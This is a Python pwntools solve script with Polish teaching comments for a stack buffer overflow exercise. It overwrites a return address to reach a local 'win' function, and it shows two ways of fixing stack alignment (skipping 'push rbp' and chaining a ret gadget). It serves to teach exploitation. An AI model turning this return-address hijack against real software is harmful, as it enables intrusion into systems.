from pwn import *

# gdb.debug otwiera debugger w osobnym terminalu. Jeżeli pwntools nie wykrywa
# automatycznie, jakiego terminala ma użyć, trzeba to skonfigurować:
# context.terminal = 'foot'
# Albo:
# context.terminal = ['alacritty', '-e']

# Wyłączamy ASLR w procesach odpalanych przez pwntools. Odpowiada to
# `setarch -R` przy ręcznym uruchamianiu zadania.
context.aslr = False

# Jeśli exploit odpalony przez python3 zad1-solve.py GDB
if args.GDB:
    p = gdb.debug('./zad1')
else:
    p = process('./zad1')

# Adres funkcji win.
win = 0x401176

# Można też go zdobyć w ten sposób:
e = ELF('./zad1')
assert win == e.sym['win']

# Podejście 1: Po 16-bajtowym buforze mamy zapisaną wartość rejestru rbp,
# a następnie adres powrotu. Spróbujmy nadpisać adres powrotu adresem funkcji
# win.
if args.DEMO_MOVAPS:
    p.sendline(b'A' * 16 + b'B' * 8 + p64(win))
    p.interactive()

    # Widzimy, że funkcja win() się wykonuje i wypisuje "WIN", ale potem
    # dostajemy segfault. W gdb dowiemy się, że segfault pojawia się głęboko
    # w implementacji funkcji system(), na instrukcji

    #     movaps xmmword ptr [rsp + 0x50], xmm0

    # Problemem jest to, że kompilator zakłada, że adres stosu jest wyrównany
    # do 16 bajtów. Może tak zrobić, ponieważ gwarantuje to ABI:

    # The end of the input argument area shall be aligned on a 16 (32,
    # if __m256 is passed on stack) byte boundary. In other words, the value
    # (%rsp + 8) is always a multiple of 16 (32) when control is transferred
    # to the function entry point. The stack pointer, %rsp, always points to
    # the end of the latest allocated stack frame.
    # ~ 3.2.2 The Stack Frame
    # ~ https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf 

    # Aby uzyskać poprawne wyrównanie stosu, mamy dwie opcje:
elif args.SKIP_PUSH_RBP:
    # Po pierwsze, możemy pominąć `push rbp` z początku implementacji
    # funkcji `win`. Patrząc na `disas win` w gdb, dowiadujemy się, że
    # `push rbp` jest pod adresem win+4, a kolejna instrukcja na win+5:
    p.sendline(b'A' * 16 + b'B' * 8 + p64(win + 5))
    p.interactive()
else:
    # Po drugie, możemy sprawić by procesor wykonał jedną instrukcję ret
    # więcej - wybieramy adres dowolnej instrukcji ret w programie:
    ret = 0x4011cd

    # i wysyłamy jej adres w miejsce adresu powrotu.
    p.sendline(b'A' * 16 + b'B' * 8 + p64(ret) + p64(win))
    p.interactive()

    # Ćwiczenie: prześledzić wykonanie obu wariantów w gdb,
    # aby zrozumieć co dokładnie się dzieje.
